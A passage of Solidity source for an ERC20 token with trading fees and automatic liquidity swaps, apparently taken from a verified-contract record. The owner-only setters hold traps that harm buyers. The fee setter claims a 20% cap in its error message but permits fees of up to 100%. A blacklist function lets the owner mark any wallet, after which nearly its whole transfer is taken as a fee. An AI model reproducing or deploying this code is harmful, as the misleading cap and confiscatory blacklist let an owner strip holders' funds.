0x000000000000000000000000000000000000dEaD;\r\n    address internal development_receiver = 0x10C2C05a8B9CC5Af3239A3dF751C53435D90A896; \r\n    address internal marketing_receiver = 0x10C2C05a8B9CC5Af3239A3dF751C53435D90A896;\r\n    address internal liquidity_receiver = 0x10C2C05a8B9CC5Af3239A3dF751C53435D90A896;\r\n    uint256 public _maxTxAmount = ( _totalSupply * 100 ) / 10000;\r\n    uint256 public _maxSellAmount = ( _totalSupply * 100 ) / 10000;\r\n    uint256 public _maxWalletToken = ( _totalSupply * 100 ) / 10000;\r\n\r\n    constructor() Ownable(msg.sender) {\r\n        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());\r\n        router = _router; pair = _pair;\r\n        isFeeExempt[address(this)] = true;\r\n        isFeeExempt[liquidity_receiver] = true;\r\n        isFeeExempt[marketing_receiver] = true;\r\n        isFeeExempt[development_receiver] = true;\r\n        isFeeExempt[msg.sender] = true;\r\n        _balances[msg.sender] = _totalSupply;\r\n        emit Transfer(address(0), msg.sender, _totalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n    function name() public pure returns (string memory) {return _name;}\r\n    function symbol() public pure returns (string memory) {return _symbol;}\r\n    function decimals() public pure returns (uint8) {return _decimals;}\r\n    function startTrading() external onlyOwner {tradingAllowed = true;}\r\n    function getOwner() external view override returns (address) { return owner; }\r\n    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}\r\n    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}\r\n    function setisExempt(address _address, bool _enabled) external onlyOwner {isFeeExempt[_address] = _enabled;}\r\n    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}\r\n    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}\r\n\r\n    function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {\r\n        bool aboveMin = amount >= minTokenAmount;\r\n        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;\r\n        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isFeeExempt[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;\r\n    }\r\n\r\n    function setContractSwapSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {\r\n        swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); \r\n        minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));\r\n    }\r\n\r\n    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {\r\n        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;\r\n        require(totalFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), \"totalFee and sellFee cannot be more than 20%\");\r\n    }\r\n\r\n    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {\r\n        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);\r\n        _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;\r\n        uint256 limit = totalSupply().mul(5).div(1000);\r\n        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, \"Max TXs and Max Wallet cannot be less than .5%\");\r\n    }\r\n\r\n    function setInternalAddresses(address _marketing, address _liquidity, address _development) external onlyOwner {\r\n        marketing_receiver = _marketing; liquidity_receiver = _liquidity; development_receiver = _development;\r\n        isFeeExempt[_marketing] = true; isFeeExempt[_liquidity] = true; isFeeExempt[_development] = true;\r\n    }\r\n\r\n    function setisBot(address[] calldata addresses, bool _enabled) external onlyOwner {\r\n        for(uint i=0; i < addresses.length; i++){\r\n        isBot[addresses[i]] = _enabled; }\r\n    }\r\n\r\n    function manualSwap() external onlyOwner {\r\n        uint256 amount = balanceOf(address(this));\r\n        if(amount > swapThreshold){amount = swapThreshold;}\r\n        swapAndLiquify(amount);\r\n    }\r\n\r\n    function rescueERC20(address _address, uint256 percent) external onlyOwner {\r\n        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);\r\n        IERC20(_address).transfer(development_receiver, _amount);\r\n    }\r\n\r\n    function swapAndLiquify(uint256 tokens) private lockTheSwap {\r\n        uint256 _denominator = (liquidityFee.add(1).add(marketingFee).add(developmentFee)).mul(2);\r\n        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);\r\n        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);\r\n        uint256 initialBalance = address(this).balance;\r\n        swapTokensForETH(toSwap);\r\n        uint256 deltaBalance = address(this).balance.sub(initialBalance);\r\n        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));\r\n        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);\r\n        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }\r\n        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFee);\r\n        if(marketingAmt > 0){payable(marketing_receiver).transfer(marketingAmt);}\r\n        uint256 contractBalance = address(this).balance;\r\n        if(contractBalance > uint256(0)){payable(development_receiver).transfer(contractBalance);}\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {\r\n        _approve(address(this), address(router), tokenAmount);\r\n        router.addLiquidityETH{value: ETHAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0,\r\n            0,\r\n            liquidity_receiver,\r\n            block.timestamp);\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = router.WETH();\r\n        _approve(address(this), address(router), tokenAmount);\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp);\r\n    }\r\n\r\n    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {\r\n        return !isFeeExempt[sender] && !isFeeExempt[recipient];\r\n    }\r\n\r\n    function getTotalFee(address sender, address recipient) internal view returns (uint256) {\r\n        if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}\r\n        if(recipient == pair){return sellFee;}\r\n        if(sender == pair){return totalFee;}\r\n        return transferFee;\r\n    }\r\n\r\n    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {\r\n        if(getTotalFee(sender, recipient) > 0){\r\n        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));\r\n        _balances[address(this)] = _balances[address(this)].add(feeAmount);\r\n        emit Transfer(sender, address(this), feeAmount);\r\n        if(burnFee > uint256(0) && getTotalFee(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}\r\n        return amount.sub(feeAmount);} return amount;\r\n    }\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount <= balanceOf(sender),\"You are trying to transfer more than your balance\");\r\n        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, \"tradingAllowed\");}\r\n        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){\r\n        require((_balances[recipient].add(amount)) <= _maxWalletToken, \"Exceeds maximum wallet amount.\");}\r\n        if(sender != pair){require(amount <= _maxSellAmount || isFeeExempt[sender] || isFeeExempt[recipient], \"TX Limit Exceeded\");}\r\n        require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], \"TX Limit Exceeded\"); \r\n        if(recipient == pair && !isFeeExempt[sender]){swapTimes += uint256(1);}\r\n        if(shouldContractSwap(sender, recipient, amount)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}\r\n        _balances[sender] = _balances[sender].sub(amount);\r\n        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;\r\n        _balances[recipient] = _balances[recipient].add(amountReceived);\r\n        emit Transfer(sender, recipient, amountReceived);\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n}",
    "etherscan_verified": true
}